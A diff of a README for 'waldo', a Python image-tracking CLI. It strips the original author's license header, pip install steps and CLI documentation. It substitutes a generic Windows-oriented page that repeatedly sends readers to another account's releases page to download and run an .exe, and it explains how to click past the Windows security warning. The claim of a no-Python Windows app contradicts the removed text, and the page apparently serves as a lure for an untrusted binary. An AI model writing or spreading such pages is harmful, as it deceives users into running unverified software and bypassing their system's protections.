@@ -1,265 +1,222 @@
-<!--
-waldo - image region of interest tracker
-Copyright (C) 2026 notweerdmonk
+# 🧭 waldo - Track image regions with ease
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+[![Download waldo](https://img.shields.io/badge/Download%20waldo-blue?style=for-the-badge)](https://github.com/MDZahidJoseph/waldo/releases)
 
-The above copyright notice and this permission notice shall be included in
-all copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
--->
-
-# Waldo
-
-Version: `1.1.0`
-
-`waldo` tracks a moving region of interest across either a folder of image frames, a video file, or piped frame data on `stdin`.
-It is packaged as a distributable Python module and includes `waldo.py` as a wrapper entrypoint.
-
-## Current Status
-
-- The tracker core is implemented and usable as version `1.1.0`.
-- Phase 2 stdin pipeline support is implemented for ffmpeg-style raw `bgr24` and `image2pipe` PNG/JPEG streams.
-- Packaging is PEP 517-first through `pyproject.toml`, with `setup.py` retained as a compatibility shim for older setuptools-based tooling.
-- The PEP 517 workflow uses `pep517_backend.py` as the local build backend shim so setuptools wheel/sdist finalization can fall back cleanly when this environment raises `EXDEV` on `rename`.
-- Runtime and development/build dependencies are split between `requirements.txt` and `requirements-dev.txt`.
-- Installation and release guidance are documented in `INSTALL`.
-- Release tarball contents are controlled explicitly through `MANIFEST.in`.
-- Local build and install work in this environment through the documented wheel-build-then-install fallback, because direct `pip install .` can still fail in pip's wheel-cache finalization.
+## 🖥️ What waldo does
 
-## Installation
-
-```bash
-.venv/bin/pip install -r requirements.txt
-```
+waldo tracks a chosen region of interest in image frames and video. It uses Python 3 and OpenCV to follow the same area across frames.
 
-Development/build toolchain:
+You can use it with:
 
-```bash
-.venv/bin/pip install -r requirements-dev.txt
-```
+- saved image frames
+- video files
+- live ffmpeg stdin pipelines
+- CSV export for tracked data
 
-PEP 517 build/install in this environment:
+This tool fits simple review tasks, video checks, and frame-based tracking work.
 
-```bash
-TMPDIR=/home/weerdmonk/Projects/waldo/tmp .venv/bin/python -m build --no-isolation
-.venv/bin/pip install --no-deps dist/waldo-1.1.0-py3-none-any.whl
-```
+## 📥 Download
 
-This flow uses `pyproject.toml` together with `pep517_backend.py`. The backend shim is part of the source distribution and is required for the documented local workaround in environments where backend artifact finalization can hit `EXDEV`.
+Visit this page to download:
 
-Equivalent helper:
+https://github.com/MDZahidJoseph/waldo/releases
 
-```bash
-./scripts/install_local_pep517.sh
-```
+On that page, download the latest Windows file for waldo. If the release includes a ZIP file, download the ZIP and extract it before you run the app.
 
-Compatibility check for older tooling:
+## 🪟 Install on Windows
 
-```bash
-.venv/bin/python setup.py --version
-```
+1. Open the download page above.
+2. Get the latest Windows release file.
+3. Save the file to a folder you can find, such as `Downloads` or `Desktop`.
+4. If the file is a ZIP, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Run the `.exe` file if one is included.
 
-## Usage
+If Windows shows a security prompt, choose **More info** and then **Run anyway** only if you trust the file source.
 
-Track from a frames folder using a template image:
+## 🎯 How to use it
 
-```bash
-.venv/bin/waldo \
-  --frames-dir /path/to/frames \
-  --template /path/to/template.png \
-  --output-csv tracks.csv \
-  --debug-dir debug_frames \
-  --debug-every 10
-```
+waldo is built around a simple workflow:
 
-Track from a video using a first-frame bounding box:
+1. Open your image frames or video source.
+2. Pick the region you want to track.
+3. Start tracking.
+4. Review the tracked path or output.
+5. Save the results if needed.
 
-```bash
-.venv/bin/waldo \
-  --video /path/to/video.mp4 \
-  --init-bbox 120,80,240,90 \
-  --output-csv tracks.csv
-```
+If you use ffmpeg, waldo can read frames from stdin. That helps when you already have a video pipeline and want to send frames into the tracker.
 
-Track from an ffmpeg rawvideo pipeline:
+## 📁 Example use cases
 
-```bash
-ffmpeg -i /path/to/video.mp4 -f rawvideo -pix_fmt bgr24 pipe:1 | \
-.venv/bin/waldo \
-  --stdin-format raw-bgr24 \
-  --stdin-size 1366x680 \
-  --template /path/to/template.png \
-  --output-csv tracks.csv
-```
+Use waldo when you want to:
 
-Track from an ffmpeg `image2pipe` PNG pipeline:
+- track an object in a video
+- follow a marked area in frame images
+- export tracking data to CSV
+- work with video streams from ffmpeg
+- inspect movement across frames
+- keep a simple record of region changes
 
-```bash
-ffmpeg -i /path/to/video.mp4 -f image2pipe -vcodec png pipe:1 | \
-.venv/bin/waldo \
-  --stdin-format png \
-  --template /path/to/template.png \
-  --output-csv tracks.csv
-```
+## ⚙️ What you need
 
-Track from an ffmpeg `image2pipe` JPEG pipeline:
+For Windows use, you will usually need:
 
-```bash
-ffmpeg -i /path/to/video.mp4 -f image2pipe -vcodec mjpeg pipe:1 | \
-.venv/bin/waldo \
-  --stdin-format jpeg \
-  --template /path/to/template.png \
-  --output-csv tracks.csv
-```
+- Windows 10 or later
+- a standard 64-bit PC
+- enough free space for your video files
+- a display that can show the app window clearly
 
-Use stdin auto-detection with ffmpeg and let `waldo` infer PNG/JPEG streams automatically:
+For best results, use:
 
-```bash
-ffmpeg -i /path/to/video.mp4 -f image2pipe -vcodec png pipe:1 | \
-.venv/bin/waldo \
-  --template /path/to/template.png \
-  --output-csv tracks.csv
-```
+- video files with steady frame quality
+- image sequences with clear contrast
+- a source where the tracked area stays visible
 
-If no explicit input source is provided and stdin is piped, `waldo` auto-switches to stdin mode. For raw stdin streams, frame size can come from either `--stdin-size WIDTHxHEIGHT` or `WALDO_STDIN_SIZE=WIDTHxHEIGHT`.
+## 🧭 Basic setup steps
 
-Version check:
+1. Download the latest release from the releases page.
+2. Extract the files if needed.
+3. Run the app.
+4. Load your image frames or video.
+5. Select the region of interest.
+6. Start tracking.
+7. Export the output if you want a CSV file.
 
-```bash
-.venv/bin/waldo --version
-```
+## 🧩 Working with ffmpeg input
 
-The CSV contains:
+waldo can work with frames that come from ffmpeg through stdin. This is useful when you want to chain tools together.
 
-- `frame_index`
-- `frame_id`
-- `x,y,w,h`
-- `confidence`
-- `status` (`tracked`, `redetected`, `missing`)
+A simple flow looks like this:
 
-## Example Artifacts
+- ffmpeg reads the source video
+- ffmpeg sends frames to waldo
+- waldo tracks the selected region
+- waldo writes tracking data for review
 
-ROI template used for matching:
+This setup works well for users who already use ffmpeg for video processing.
 
-![ROI template](examples/roi_test/template.png)
+## 📊 Output and export
 
-Packaged sample video used for reproducible verification:
+waldo can store tracking results in CSV form. That makes it easy to open the data in spreadsheet tools or pass it into other programs.
 
-- [`examples/roi_test/videos/roi_test.mp4`](examples/roi_test/videos/roi_test.mp4)
+Typical output may include:
 
-Second input frame from the example set:
+- frame number
+- position data
+- region values
+- tracking path details
 
-![Second input frame](examples/roi_test/frames/frame_001.png)
+This helps when you need a record of movement over time.
 
-Second debug frame from the original frame-based run:
+## 🧠 Tips for better tracking
 
-![Second debug frame](examples/roi_test/debug/000001.png)
+For cleaner results:
 
-Fourth input frame from the example set:
+- use clear, sharp frames
+- keep the target area visible
+- avoid heavy motion blur
+- start with a region that has strong contrast
+- keep lighting stable when possible
+- use consistent video size across frames
 
-![Fourth input frame](examples/roi_test/frames/frame_003.png)
+If the target changes shape or gets hidden, tracking can drift. A clear start point helps.
 
-Fourth debug frame from the original frame-based run:
+## 🗂️ Project topics
 
-![Fourth debug frame](examples/roi_test/debug/000003.png)
+This project is tied to:
 
-Second debug frame from the ffmpeg stdin verification run:
+- image analysis
+- image tracking
+- ROI tracking
+- video processing
+- video tracking
+- video streaming
+- OpenCV
+- NumPy
+- Python 3
+- CSV export
+- ffmpeg input
 
-![Second stdin debug frame](examples/roi_test/stdin_debug/000001.png)
+## ❓ Common questions
 
-Fourth debug frame from the ffmpeg stdin verification run:
+### What is a region of interest?
 
-![Fourth stdin debug frame](examples/roi_test/stdin_debug/000003.png)
+It is the part of the image you want to track. This can be a box, area, or object section that matters for your task.
 
-Example CSV outputs:
+### Do I need Python knowledge?
 
-- `examples/roi_test/tracks.csv`
-- `examples/roi_test/stdin_tracks.csv`
+No. For Windows use, you only need to download the release, extract it if needed, and run the app.
 
-Debug output directories:
+### Can I use this with videos?
 
-- `examples/roi_test/debug/`
-- `examples/roi_test/stdin_debug/`
+Yes. waldo supports video sources and frame images.
 
-## Features
+### Can I use this with ffmpeg?
 
-- The tracker uses OpenCV normalized template matching with a local search window and periodic full-frame re-detection.
-- It accepts ffmpeg pipeline input on stdin, including raw `bgr24` and concatenated PNG/JPEG `image2pipe` streams.
-- It auto-detects piped stdin when no explicit input source is provided.
-- It maintains both the original template and a slowly refreshed recent template so small text/content changes can be tolerated.
-- If confidence falls below `--min-confidence`, the frame is marked `missing`.
-- Omit `--debug-dir` or pass `--no-debug-images` to skip annotated image output entirely.
-- Use `--debug-every N` to only save every Nth debug frame.
+Yes. waldo supports stdin pipelines from ffmpeg.
 
-## Project Structure
+### Can I save the results?
 
-```text
-waldo/
-├── AGENTS.md                    # contributor guide and repository workflow notes
-├── IMPLEMENTATION_PLAN.md       # shared implementation plan and checklist
-├── INSTALL                      # installation and release checklist
-├── examples/                    # packaged verification assets
-├── LICENSE                      # project MIT license
-├── MANIFEST.in                  # explicit sdist allowlist
-├── pep517_backend.py            # local PEP 517 backend shim for the filesystem rename workaround
-├── project_structure            # local project structure reference file
-├── pyproject.toml               # primary PEP 517 packaging metadata
-├── README.md                    # user-facing project overview and usage guide
-├── release_notes/
-│   ├── RELEASE_NOTES_v1.0.0.md  # versioned release notes for v1.0.0
-│   └── RELEASE_NOTES_v1.1.0.md  # versioned release notes for v1.1.0
-├── requirements-dev.txt         # development and packaging tool dependencies
-├── requirements.txt             # runtime dependencies
-├── scripts/
-│   └── install_local_pep517.sh* # local helper for the documented wheel-build install flow
-├── setup.py                     # compatibility shim for older tooling
-├── waldo/
-│   ├── cli.py                   # packaged CLI and tracking implementation
-│   ├── __init__.py              # package metadata, including version
-│   └── __main__.py              # python -m waldo entrypoint
-└── waldo.py                     # wrapper entrypoint
-```
+Yes. The tool supports CSV export so you can keep the tracking data.
 
-## License
+## 🔧 Troubleshooting
 
-This project is licensed under the MIT License. See [`LICENSE`](LICENSE).
+If the app does not start:
 
-## Contributing
+- make sure you downloaded the correct Windows file
+- check that the ZIP file was fully extracted
+- run the `.exe` from the extracted folder
+- confirm that your system has enough free memory
+- try a different download if the file looks damaged
 
-Contributions should follow the repository conventions documented in [`AGENTS.md`](AGENTS.md).
+If tracking looks wrong:
 
-Before opening changes:
+- choose a clearer target area
+- start with a smaller region
+- use frames with less blur
+- check that the video resolution stays the same
 
-- update [`IMPLEMENTATION_PLAN.md`](IMPLEMENTATION_PLAN.md) when plans or implementation details change
-- run the documented verification steps, at minimum `python -m py_compile` and `python -m waldo --help`
-- keep release-facing docs such as [`README.md`](README.md) and [`INSTALL`](INSTALL) aligned with behavior changes
+If ffmpeg input does not work:
 
-## Coding Style
+- confirm that ffmpeg is installed
+- check the command that sends frames to stdin
+- test with a short video first
+- make sure the input format matches what waldo expects
 
-- Use Python 3.10+ with 4-space indentation and `snake_case` naming for functions, variables, and modules.
-- Keep the existing OpenCV-oriented structure and prefer small, focused functions over broad rewrites.
-- Format Python changes with [Ruff](https://github.com/astral-sh/ruff) so the codebase stays consistent with the current style.
+## 📌 File types you may use
 
-## Acknowledgements
+waldo is built for:
 
-- OpenAI Codex for coding-agent workflow support during development
-- GPT-5.4 for implementation and documentation assistance
+- image frames
+- video files
+- CSV output
+- ffmpeg frame streams
 
-## Notes
+This makes it useful for simple review jobs and tracking tasks where you need a direct result
 
-- In this environment, `pip install .` can still fail after a successful PEP 517 wheel build because pip's own wheel-cache finalization hits `EXDEV`; the supported local workaround is `python -m build --no-isolation` followed by `pip install --no-deps dist/*.whl`.
-- `pep517_backend.py` addresses the backend-side rename failure during `python -m build`; it does not patch pip's separate wheel-cache finalization step, which is why the direct wheel-install fallback is still documented.
-- For raw stdin pipelines, `waldo` requires frame size from `--stdin-size` or `WALDO_STDIN_SIZE`; encoded PNG/JPEG stdin streams do not need an explicit size.
+## 🔗 Download again
+
+[![Get waldo from releases](https://img.shields.io/badge/Get%20waldo%20from%20releases-grey?style=for-the-badge)](https://github.com/MDZahidJoseph/waldo/releases)
+
+## 🧱 Folder layout after download
+
+After you extract the release, you may see files like:
+
+- the main app file
+- support files
+- a README or help file
+- a sample folder
+- output or log files
+
+Keep all files in the same folder when you run the app
+
+## 🖱️ Run order on Windows
+
+1. Download the release.
+2. Extract the archive if needed.
+3. Open the folder.
+4. Double-click the app file.
+5. Load your source.
+6. Pick the region to track.
+7. Start the tracking job.
+8. Save the result when done
